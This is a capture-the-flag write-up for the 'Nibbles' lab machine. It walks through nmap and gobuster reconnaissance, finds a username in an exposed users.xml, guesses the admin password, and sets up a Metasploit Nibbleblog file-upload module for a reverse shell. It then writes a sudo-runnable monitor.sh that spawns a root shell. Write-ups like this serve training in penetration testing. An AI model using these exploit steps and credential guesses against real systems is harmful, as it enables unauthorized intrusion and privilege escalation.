## Summary
An easy but frustrating box, based on the guessing required to get a foothold on the machine. Nevertheless let us take a look. 

## Foothold
We start out with an nmap scan
```console
# Nmap 7.92 scan initiated Sun Feb  6 18:31:21 2022 as: nmap -sC -sV -o nmap/ini.txt 10.129.96.84

```
Two ports are open, 22 and 80. Visiting the web application hosted on 80 we get greeted with a simple hello world. However, looking at the HTML source code we get told about a directory name `/nibbleblog/`{: .filepath}. If we access the directory we find a blog, powered by `Nibbleblog`.

![Nibbleblog](nibbleblog.png)

If we scan this directory with gobuster we find a lot of other directories as well. 

```console

If we go to the content directory, we discover that it has directory listing enabled. We can then find a file named `users.xml`{: .filepath}, containing a username:

![users.xml](xml.png)
_Content of users.xml_

If we search for nibbleblog exploits, we find the following [two](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html) [links](https://www.exploit-db.com/exploits/38489). One is a exploitdb post detailing a metasploit module that allows us to gain a reverse shell on a system using nibbleblog version 4.0.3, while the other is a poc we would have to run ourselves. When trying the metasploit module we have to guess the credentials of the admin user. The credentials `admin:nibbles` seem to work, giving us a reverse shell:

```console
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog
TARGETURI => /nibbleblog
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.96.84
RHOSTS => 10.129.96.84
msf6 exploit(multi/http/nibbleblog_file_upload) > run

```

## Privilege escalation
We first start out by running `sudo -l`, giving is the following output:

```console
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
If we go to nibblers home directory we see that there is no file named `home/nibbler/personal/stuff/monitor.sh`, indeed there is not even a directory named `personal`. 
```console
pwd
/home/nibbler
ls -al
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Jun 24 17:59 user.txt
```
What we can do is we can simply create a file with the correct path that does whatever we want, and when called that file will give us a root shell. 

```console
echo "/bin/bash" > monitor.sh
chmod +x monitor.sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
<er/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh             
root@Nibbles:/home/nibbler/personal/stuff# 
```
Rooted!
